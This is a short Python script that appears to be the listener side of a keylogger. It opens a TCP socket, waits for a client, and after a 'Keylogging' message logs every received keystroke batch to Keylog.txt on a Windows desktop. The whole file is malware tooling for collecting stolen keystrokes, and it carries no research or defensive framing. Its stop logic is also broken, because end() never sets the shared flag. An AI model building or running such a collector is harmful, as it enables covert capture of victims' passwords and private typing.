import socket
import time
import threading
host = "127.0.0.1"
port = 1222
s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.bind((host, port))
ended = False
s.listen(5)
cs, address = s.accept()
print("This is output server")
def recv():
    global ended
    while True:
        datar = cs.recv(1024)
        datar2 = ''
        datar2 += datar.decode("utf-8")
        print(datar2.strip() + '\n')
        if datar2 == "Keylogging":
            datar2 = ''
            while True:
                datar3 = cs.recv(1024)
                print(datar3.decode("utf-8"))
                with open("C:/Users/cralb/Desktop/Keylog.txt", "a") as f:
                    f.write(datar3.decode("utf-8") + "\n")
                if ended:
                    ended = False
                    break

def end():
    while True:
        datar = cs.recv(1024)
        if datar.decode("utf-8") == "End:":
            ended = True
t1 = threading.Thread(target=recv)
t2 = threading.Thread(target=end)
t1.start()
t2.start()
